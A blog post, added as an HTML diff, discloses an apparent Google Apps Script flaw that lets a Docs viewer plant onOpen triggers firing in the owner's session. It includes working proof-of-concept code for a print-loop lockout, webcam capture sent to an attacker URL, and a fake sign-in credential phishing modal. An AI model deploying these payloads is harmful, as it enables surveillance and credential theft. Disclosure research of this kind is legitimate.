@@ -1,0 +1,513 @@
+<!DOCTYPE html>
+<html lang="en-us" dir="ltr">
+    <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="While building automations in Google Docs, I discovered a hidden flaw in Apps Script that gives read-only viewers unexpected power&hellip;.\nMillions of people around the world rely on Google Docs every single day, trusting the platform with everything from personal notes to highly confidential corporate data. To make these documents even more powerful, Google provides a tool called Google Apps Script—a cloud-based JavaScript platform designed to extend and automate Google Workspace applications.\n">
+<title>The Silent Trigger: How Viewer Access Leads to UI Abuse in Google Workspace</title>
+
+
+<link rel="canonical" href="http://localhost:1313/posts/my-first-writeup/">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link rel="preload" as="style" href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap">
+
+
+<link rel="stylesheet" href="/scss/style.min.f400d48f3e3e2a9350f065827c85daf833c36a1b8d677470fc5b620e46201189.css"><meta property='og:title' content="The Silent Trigger: How Viewer Access Leads to UI Abuse in Google Workspace">
+<meta property='og:description' content="While building automations in Google Docs, I discovered a hidden flaw in Apps Script that gives read-only viewers unexpected power&hellip;.\nMillions of people around the world rely on Google Docs every single day, trusting the platform with everything from personal notes to highly confidential corporate data. To make these documents even more powerful, Google provides a tool called Google Apps Script—a cloud-based JavaScript platform designed to extend and automate Google Workspace applications.\n">
+<meta property='og:url' content='http://localhost:1313/posts/my-first-writeup/'>
+<meta property='og:site_name' content='Karthik Pillai | Blog'>
+<meta property='og:type' content='article'><meta property='article:section' content='Posts' /><meta property='article:published_time' content='2026-05-14T11:49:38&#43;05:30'/><meta property='article:modified_time' content='2026-05-14T11:49:38&#43;05:30'/>
+<meta name="twitter:title" content="The Silent Trigger: How Viewer Access Leads to UI Abuse in Google Workspace">
+<meta name="twitter:description" content="While building automations in Google Docs, I discovered a hidden flaw in Apps Script that gives read-only viewers unexpected power&hellip;.\nMillions of people around the world rely on Google Docs every single day, trusting the platform with everything from personal notes to highly confidential corporate data. To make these documents even more powerful, Google provides a tool called Google Apps Script—a cloud-based JavaScript platform designed to extend and automate Google Workspace applications.\n">
+    </head>
+    <body class="
+    article-page
+    ">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            localStorage.setItem(colorSchemeKey, "dark");
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.documentElement.dataset.scheme = 'dark';
+        } else {
+            document.documentElement.dataset.scheme = 'light';
+        }
+    })();
+</script>
+<div class="container main-container flex on-phone--column compact"><aside class="sidebar left-sidebar sticky ">
+    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="Toggle Menu">
+        <span class="hamburger-box">
+            <span class="hamburger-inner"></span>
+        </span>
+    </button>
+
+    <header>
+        
+        
+        <div class="site-meta">
+            <h1 class="site-name"><a href="/">Karthik Pillai | Blog</a></h1>
+            <h2 class="site-description"></h2>
+        </div>
+    </header><ol class="menu" id="main-menu">
+        
+        
+        
+        <li >
+            <a href='/' >
+                
+                <span>Home</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/about/' >
+                
+                <span>About</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/posts/' >
+                
+                <span>Write up</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/share/' >
+                
+                <span>Share</span>
+            </a>
+        </li>
+        
+        <li class="menu-bottom-section">
+            <ol class="menu">
+
+                
+            </ol>
+        </li>
+    </ol>
+</aside>
+
+    
+
+            <main class="main full-width">
+    <article class="main-article">
+    <header class="article-header">
+
+    <div class="article-details">
+    
+
+    <div class="article-title-wrapper">
+        <h2 class="article-title">
+            <a href="/posts/my-first-writeup/">The Silent Trigger: How Viewer Access Leads to UI Abuse in Google Workspace</a>
+        </h2>
+    
+        
+    </div>
+
+    
+    
+    
+    
+    
+    
+    
+    <footer class="article-meta">
+        
+            <div class="inline-meta">
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
+  <circle cx="18" cy="18" r="4" />
+  <path d="M15 3v4" />
+  <path d="M7 3v4" />
+  <path d="M3 11h16" />
+  <path d="M18 16.496v1.504l1 1" />
+</svg>
+                    <time class="article-time--published" datetime='2026-05-14T11:49:38&#43;05:30'>Thursday, May 14, 2026</time>
+                
+
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
+
+
+
+                    <time class="article-time--reading">
+                        7 minutes read
+                    </time>
+                
+            </div>
+        
+
+        
+
+        
+    </footer>
+    
+</div>
+
+</header>
+
+    
+
+    <section class="article-content">
+    
+    
+    <p>While building automations in Google Docs, I discovered a hidden flaw in Apps Script that gives read-only viewers unexpected power&hellip;.</p>
+<p>Millions of people around the world rely on Google Docs every single day, trusting the platform with everything from personal notes to highly confidential corporate data. To make these documents even more powerful, Google provides a tool called Google Apps Script—a cloud-based JavaScript platform designed to extend and automate Google Workspace applications.</p>
+<p>A core feature of this platform is the use of &ldquo;triggers.&rdquo; Think of triggers as automated tripwires; they are rules that tell a script to run automatically in the background whenever a specific event occurs. Users love to automate their workspaces to eliminate repetitive tasks. For example, you might use a trigger to:</p>
+<p>Automatically send an email alert the moment a specific document is modified.</p>
+<p>Generate and distribute a weekly PDF report every Friday at 5 PM.</p>
+<p>Instantly format or validate new data as it is entered.</p>
+<h2 id="the-core-problem">The Core Problem
+</h2><p>Google&rsquo;s official documentation states clearly:</p>
+
+    <blockquote>
+        <p><em>&ldquo;They don&rsquo;t run if a file is opened in read-only (view or comment) mode. For standalone scripts, users need at least view access to the script file for triggers to run properly.&rdquo;</em></p>
+
+    </blockquote>
+<p>However, during my research, I observed a critical deviation from this rule. While it is true that the trigger won&rsquo;t run when the <em>Viewer</em> opens the file, the system fails to prevent the Viewer from <em>creating</em> the trigger in the first place. By binding an <code>onOpen</code> trigger to a specific Document ID, the read-only user can plant a trap. Because the trigger is tied to the document itself, it fires inside the <strong>owner&rsquo;s or editor&rsquo;s</strong> session the next time they open or refresh the file.</p>
+<p>The result: a low-privileged user forcing arbitrary code to execute in a high-privileged user&rsquo;s browser, entirely within the trusted <code>docs.google.com</code> domain.</p>
+<hr>
+<h2 id="how-the-attack-works-setup">How the Attack Works (Setup)
+</h2><p>The attacker—operating with only Viewer access—needs nothing more than the document&rsquo;s ID. From a separate Apps Script project, they run this script once:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">myFunction</span>() {
+</span></span><span style="display:flex;"><span>  <span style="color:#75715e">// Clean up any old triggers
+</span></span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">ScriptApp</span>.<span style="color:#a6e22e">getProjectTriggers</span>().<span style="color:#a6e22e">forEach</span>(<span style="color:#a6e22e">trigger</span> =&gt;
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">ScriptApp</span>.<span style="color:#a6e22e">deleteTrigger</span>(<span style="color:#a6e22e">trigger</span>)
+</span></span><span style="display:flex;"><span>  );
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#75715e">// Bind a trigger to the target document using only its ID
+</span></span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">ScriptApp</span>.<span style="color:#a6e22e">newTrigger</span>(<span style="color:#e6db74">&#39;formTriggerRan&#39;</span>)
+</span></span><span style="display:flex;"><span>    .<span style="color:#a6e22e">forDocument</span>(<span style="color:#e6db74">&#39;DOCUMENT_ID_HERE&#39;</span>)
+</span></span><span style="display:flex;"><span>    .<span style="color:#a6e22e">onOpen</span>()
+</span></span><span style="display:flex;"><span>    .<span style="color:#a6e22e">create</span>();
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>From this point on, every time the document owner or editor refreshes the file, <code>formTriggerRan()</code> executes silently in their session.</p>
+<hr>
+<h2 id="scenario-1--basic-proof-of-concept">Scenario 1 — Basic Proof of Concept
+</h2><p>The simplest payload: a modal alert that pops up in the owner&rsquo;s browser.</p>
+<p>Steps to Reproduce</p>
+<ol>
+<li>
+<p>The Document Owner creates a new Google Document and shares it with the attacker, granting them only Viewer access.</p>
+</li>
+<li>
+<p>The attacker opens the document and copies the Document ID from the URL (the long alphanumeric string between /d/ and /edit).</p>
+</li>
+<li>
+<p>The attacker opens a separate, standalone Google Apps Script project (not the one attached to the document) and pastes the exploit code below, inserting the victim&rsquo;s Document ID.</p>
+</li>
+<li>
+<p>The attacker manually runs myFunction(). Despite only having Viewer access to the target document, the Apps Script engine successfully creates the onOpen trigger without any error.</p>
+</li>
+<li>
+<p>The next time the Owner opens or refreshes the document, the trigger fires silently in their session, and the HTML modal appears natively inside Google Docs.</p>
+</li>
+</ol>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span> <span style="color:#f92672">*</span> <span style="color:#a6e22e">STEP</span> <span style="color:#ae81ff">1</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">Trigger</span> <span style="color:#a6e22e">setup</span> <span style="color:#960050;background-color:#1e0010">—</span> <span style="color:#a6e22e">run</span> <span style="color:#66d9ef">this</span> <span style="color:#a6e22e">ONCE</span> <span style="color:#a6e22e">manually</span> <span style="color:#a6e22e">as</span> <span style="color:#a6e22e">the</span> <span style="color:#a6e22e">Viewer</span> (<span style="color:#a6e22e">attacker</span>)
+</span></span><span style="display:flex;"><span> <span style="color:#f92672">*</span><span style="color:#960050;background-color:#1e0010">/</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">myFunction</span>() {
+</span></span><span style="display:flex;"><span>  <span style="color:#75715e">// Remove any existing triggers (keeps the environment clean)
+</span></span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">ScriptApp</span>.<span style="color:#a6e22e">getProjectTriggers</span>().<span style="color:#a6e22e">forEach</span>(<span style="color:#a6e22e">trigger</span> =&gt;
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">ScriptApp</span>.<span style="color:#a6e22e">deleteTrigger</span>(<span style="color:#a6e22e">trigger</span>)
+</span></span><span style="display:flex;"><span>  );
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#75715e">// Bind an onOpen trigger to the victim&#39;s document using only its ID
+</span></span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">ScriptApp</span>.<span style="color:#a6e22e">newTrigger</span>(<span style="color:#e6db74">&#39;formTriggerRan&#39;</span>)
+</span></span><span style="display:flex;"><span>    .<span style="color:#a6e22e">forDocument</span>(<span style="color:#e6db74">&#39;1RGW8gHSimkiFUcw_aerFG5_2rzGVBgdmAGrIxGDOCA0&#39;</span>) <span style="color:#75715e">// ← victim&#39;s Document ID
+</span></span></span><span style="display:flex;"><span>    .<span style="color:#a6e22e">onOpen</span>()
+</span></span><span style="display:flex;"><span>    .<span style="color:#a6e22e">create</span>();
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">/**
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"> * STEP 2: The payload — runs automatically when the Owner opens the document
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"> */</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">formTriggerRan</span>(<span style="color:#a6e22e">e</span>) {
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">html</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">HtmlService</span>
+</span></span><span style="display:flex;"><span>    .<span style="color:#a6e22e">createHtmlOutput</span>(<span style="color:#e6db74">&#39;&lt;script&gt;alert(&#34;Executed as Owner&#34;);google.script.host.close();&lt;/script&gt;&#39;</span>)
+</span></span><span style="display:flex;"><span>    .<span style="color:#a6e22e">setWidth</span>(<span style="color:#ae81ff">200</span>)
+</span></span><span style="display:flex;"><span>    .<span style="color:#a6e22e">setHeight</span>(<span style="color:#ae81ff">100</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#75715e">// Renders natively inside the Google Docs UI — no external links, no redirects
+</span></span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">DocumentApp</span>.<span style="color:#a6e22e">getUi</span>().<span style="color:#a6e22e">showModalDialog</span>(<span style="color:#a6e22e">html</span>, <span style="color:#e6db74">&#39;Security Alert&#39;</span>);
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><video width="100%" controls>
+  <source src="/videos/SE1.mp4" type="video/mp4">
+</video>
+<p>What the owner sees: An unexpected alert popup appearing directly inside their own document.</p>
+<h2 id="scenario-2--ui-denial-of-service-infinite-print-loop">Scenario 2 — UI Denial of Service (Infinite Print Loop)
+</h2><p>A slightly nastier payload locks up the document entirely. The attacker creates a hidden 1×1 pixel window that forces the browser&rsquo;s print dialog to open  and reopens it every second, even if the owner clicks &ldquo;Cancel.&rdquo;</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">formTriggerRan</span>(<span style="color:#a6e22e">e</span>) {
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">html</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">HtmlService</span>.<span style="color:#a6e22e">createHtmlOutput</span>(<span style="color:#e6db74">`
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    &lt;script&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">      function spamPrint() {
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        window.print();
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        setTimeout(spamPrint, 1000);
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">      }
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">      spamPrint();
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    &lt;/script&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  `</span>).<span style="color:#a6e22e">setWidth</span>(<span style="color:#ae81ff">1</span>).<span style="color:#a6e22e">setHeight</span>(<span style="color:#ae81ff">1</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">DocumentApp</span>.<span style="color:#a6e22e">getUi</span>().<span style="color:#a6e22e">showModalDialog</span>(<span style="color:#a6e22e">html</span>, <span style="color:#e6db74">&#39;Print Preview&#39;</span>);
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><video width="100%" controls>
+  <source src="/videos/SE2.mp4" type="video/mp4">
+</video>
+<p><strong>Impact:</strong> The owner is stuck in an inescapable print loop. The document becomes completely unusable until they know to force close the tab.</p>
+<hr>
+<h2 id="scenario-3--covert-camera-exfiltration">Scenario 3 — Covert Camera Exfiltration
+</h2><p>This is where it escalates into a serious privacy breach.</p>
+<p>The attacker sets up a two-part system:</p>
+<ol>
+<li>A <strong>Web App</strong> (their own Apps Script project) that receives captured images by email.</li>
+<li>A <strong>camera trap HTML file</strong> delivered via the trigger as a modal titled &ldquo;Security Check.&rdquo;</li>
+</ol>
+<p>When the owner refreshes the page, a popup appears natively within Google Docs requesting camera and video permissions. Crucially, the script can only capture photos if the user explicitly enables this camera access. If the owner clicks &ldquo;Allow&rdquo; (or if they have previously granted camera permissions to Google Docs, in which case it won&rsquo;t even ask), the exploit proceeds.Once permission is granted, their front camera is covertly activated.
+The script then captures photos of the owner every five seconds and sends them to an attacker controlled email address or domain. The attacker can continuously receive and view these images.</p>
+<p><strong>The receiver (attacker&rsquo;s web app):</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">doPost</span>(<span style="color:#a6e22e">e</span>) {
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">base64Data</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">e</span>.<span style="color:#a6e22e">parameter</span>.<span style="color:#a6e22e">image</span>.<span style="color:#a6e22e">replace</span>(<span style="color:#e6db74">/^data:image\/[a-z]+;base64,/</span>, <span style="color:#e6db74">&#39;&#39;</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">imageBlob</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">Utilities</span>.<span style="color:#a6e22e">newBlob</span>(
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">Utilities</span>.<span style="color:#a6e22e">base64Decode</span>(<span style="color:#a6e22e">base64Data</span>), <span style="color:#e6db74">&#39;image/jpeg&#39;</span>, <span style="color:#e6db74">&#39;capture.jpg&#39;</span>
+</span></span><span style="display:flex;"><span>  );
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">GmailApp</span>.<span style="color:#a6e22e">sendEmail</span>(
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;attacker@email.com&#39;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">`Webcam Capture: </span><span style="color:#e6db74">${</span><span style="color:#a6e22e">e</span>.<span style="color:#a6e22e">parameter</span>.<span style="color:#a6e22e">user</span><span style="color:#e6db74">}</span><span style="color:#e6db74">`</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;Captured image attached.&#39;</span>,
+</span></span><span style="display:flex;"><span>    { <span style="color:#a6e22e">attachments</span><span style="color:#f92672">:</span> [<span style="color:#a6e22e">imageBlob</span>] }
+</span></span><span style="display:flex;"><span>  );
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">ContentService</span>.<span style="color:#a6e22e">createTextOutput</span>(<span style="color:#a6e22e">JSON</span>.<span style="color:#a6e22e">stringify</span>({ <span style="color:#a6e22e">status</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;OK&#39;</span> }))
+</span></span><span style="display:flex;"><span>    .<span style="color:#a6e22e">setMimeType</span>(<span style="color:#a6e22e">ContentService</span>.<span style="color:#a6e22e">MimeType</span>.<span style="color:#a6e22e">JSON</span>);
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p><strong>The camera trap (runs in the owner&rsquo;s browser):</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">stream</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">navigator</span>.<span style="color:#a6e22e">mediaDevices</span>.<span style="color:#a6e22e">getUserMedia</span>({ <span style="color:#a6e22e">video</span><span style="color:#f92672">:</span> <span style="color:#66d9ef">true</span>, <span style="color:#a6e22e">audio</span><span style="color:#f92672">:</span> <span style="color:#66d9ef">false</span> });
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">video</span>.<span style="color:#a6e22e">srcObject</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">stream</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">setInterval</span>(() =&gt; {
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">canvas</span>.<span style="color:#a6e22e">getContext</span>(<span style="color:#e6db74">&#39;2d&#39;</span>).<span style="color:#a6e22e">drawImage</span>(<span style="color:#a6e22e">video</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">320</span>, <span style="color:#ae81ff">240</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">screenshot</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">canvas</span>.<span style="color:#a6e22e">toDataURL</span>(<span style="color:#e6db74">&#39;image/jpeg&#39;</span>, <span style="color:#ae81ff">0.7</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">fetch</span>(<span style="color:#a6e22e">ATTACKER_URL</span>, {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">method</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;POST&#39;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">body</span><span style="color:#f92672">:</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">URLSearchParams</span>({ <span style="color:#a6e22e">image</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">screenshot</span>, <span style="color:#a6e22e">time</span><span style="color:#f92672">:</span> <span style="color:#66d9ef">new</span> Date().<span style="color:#a6e22e">toISOString</span>() })
+</span></span><span style="display:flex;"><span>  });
+</span></span><span style="display:flex;"><span>}, <span style="color:#ae81ff">5000</span>);
+</span></span></code></pre></div><p>Unfortunately, I did not record a video Proof of Concept for this specific camera exfiltration attack. However, I do have the actual captured image that the script successfully exfiltrated to my attacker controlled email address.</p>
+<img src="/images/Im1.png" width="70%" alt="Proof of Concept Screenshot">
+<img src="/images/Im2.png" width="70%" alt="Proof of Concept Screenshot">
+<p><strong>Why this is especially dangerous:</strong> The camera permission prompt appears inside the document the owner already trusts, on Google&rsquo;s own domain. There are no suspicious links, no spoofed websites nothing that would normally raise a red flag.</p>
+<p><em>A few days after this was reported to Google, the image exfiltration stopped working, suggesting a server-side patch was applied.</em></p>
+<hr>
+<h2 id="scenario-4--zero-click-credential-phishing">Scenario 4 — Zero-Click Credential Phishing
+</h2><p>Standard phishing requires a victim to click a suspicious link and ignore a wrong URL. This attack requires neither.</p>
+<p>The trigger renders a <strong>fake Google Sign-In modal</strong> directly inside the real document, on the real <code>docs.google.com</code> domain. Now, you might be thinking: <em>I would spot a fake login screen immediately.</em> And it is true that a highly vigilant user might notice something feels slightly &ldquo;off&rdquo; about the prompt. I am not saying every single person will fall for this trap every time.</p>
+<p>However, context is everything. Because you are safely navigating your own document on a legitimate Google URL, your guard is naturally down. When you are deep in the middle of working and a familiar looking &ldquo;session expired&rdquo; box pops up natively on the screen, it is incredibly easy to just type your password on autopilot. The owner, believing they simply need to re-authenticate, enters their credentials—which are silently sent to the attacker&rsquo;s webhook in real time.</p>
+<p><strong>Trigger setup:</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">myFunction</span>() {
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">ScriptApp</span>.<span style="color:#a6e22e">getProjectTriggers</span>().<span style="color:#a6e22e">forEach</span>(<span style="color:#a6e22e">trigger</span> =&gt; <span style="color:#a6e22e">ScriptApp</span>.<span style="color:#a6e22e">deleteTrigger</span>(<span style="color:#a6e22e">trigger</span>));
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">ScriptApp</span>.<span style="color:#a6e22e">newTrigger</span>(<span style="color:#e6db74">&#39;showPhishingModal&#39;</span>)
+</span></span><span style="display:flex;"><span>    .<span style="color:#a6e22e">forDocument</span>(<span style="color:#e6db74">&#39;DOCUMENT_ID_HERE&#39;</span>)
+</span></span><span style="display:flex;"><span>    .<span style="color:#a6e22e">onOpen</span>()
+</span></span><span style="display:flex;"><span>    .<span style="color:#a6e22e">create</span>();
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">showPhishingModal</span>(<span style="color:#a6e22e">e</span>) {
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">html</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">HtmlService</span>.<span style="color:#a6e22e">createHtmlOutputFromFile</span>(<span style="color:#e6db74">&#39;login-spoof&#39;</span>)
+</span></span><span style="display:flex;"><span>    .<span style="color:#a6e22e">setWidth</span>(<span style="color:#ae81ff">450</span>)
+</span></span><span style="display:flex;"><span>    .<span style="color:#a6e22e">setHeight</span>(<span style="color:#ae81ff">650</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">DocumentApp</span>.<span style="color:#a6e22e">getUi</span>().<span style="color:#a6e22e">showModalDialog</span>(<span style="color:#a6e22e">html</span>, <span style="color:#e6db74">&#39;Sign in to Google Docs&#39;</span>);
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><video width="100%" controls>
+  <source src="/videos/SE4.mp4" type="video/mp4">
+</video>
+<hr>
+<hr>
+<h3 id="final-thoughts--status">Final Thoughts &amp; Status
+</h3><p>Before I sign off, I want to mention that I am very much still a beginner in the web security field. I&rsquo;m taking things one step at a time, studying different architectures, and learning as I go.</p>
+<p>I stumbled upon this UI behavior during my research and thought it was an interesting edge case worth sharing. I have already reported this to Google, and it is currently undergoing further review by their team. I am still learning how to gauge exact impact levels, so whether this turns out to be a genuine issue or just a weird feature, I hope you found the write up interesting!</p>
+
+</section>
+
+
+    <footer class="article-meta article-footer">
+    
+
+    </footer>
+
+
+    
+</article>
+
+    
+
+    
+
+     
+    
+        
+
+        <div class="disqus-container">
+    
+</div>
+
+<style>
+    .disqus-container {
+        background-color: var(--card-background);
+        border-radius: var(--card-border-radius);
+        box-shadow: var(--shadow-l1);
+        padding: var(--card-padding);
+    }
+</style>
+
+<script>
+    window.addEventListener('onColorSchemeChange', (e) => {
+        if (typeof DISQUS == 'object') {
+            DISQUS.reset({
+                reload: true
+            });
+        }
+    })
+</script>
+
+    
+
+    <footer class="site-footer">
+    <section class="copyright">
+        &copy; 
+        
+        2026 Karthik Pillai | Blog
+    </section>
+    
+    <section class="powerby">
+        Built with <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> <br />
+        Theme <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="4.0.2">Stack</a></b> designed by <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a>
+    </section>
+</footer>
+
+
+    
+
+
+
+<script type="module">
+    import gallery from '\/ts\/gallery.js';
+
+    const articleContent = document.querySelector('.article-content');
+    const shouldLoad = articleContent && (articleContent.querySelectorAll('figure').length > 0 || articleContent.querySelectorAll('img.gallery-image').length > 0);
+    
+    if (shouldLoad) {
+        gallery(articleContent);
+
+        const PhotoSwipeLightbox = (await import("https:\/\/cdn.jsdelivr.net\/npm\/photoswipe@5.4.4\/dist\/photoswipe-lightbox.esm.min.js")).default;
+        const styleHref = "https:\/\/cdn.jsdelivr.net\/npm\/photoswipe@5.4.4\/dist\/photoswipe.css";
+
+        const styleTag = document.createElement('link');
+        styleTag.rel = 'stylesheet';
+        styleTag.href = styleHref;
+        document.head.appendChild(styleTag);
+
+        const lightbox = new PhotoSwipeLightbox({
+            gallerySelector: '.article-content',
+            childSelector: 'figure a.image-link',
+            pswpModule: () => import("https:\/\/cdn.jsdelivr.net\/npm\/photoswipe@5.4.4\/dist\/photoswipe.esm.min.js")
+        });
+        lightbox.init();
+    }
+</script>
+
+    
+
+            </main>
+        </div>
+        
+<script type="text/javascript" src="/ts/main.912f0c9ec652a1d0e86e5a301a9c5a015076a05980bebb86ecece1a3c05b6a26.js" defer></script>
+<div class="floating-tools">
+    <button id="toggle-reading" title="Reading Mode">
+        <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+            <path d="M2 3h6a4 4 0 0 1 4 4v14a3 3 0 0 0-3-3H2z"></path>
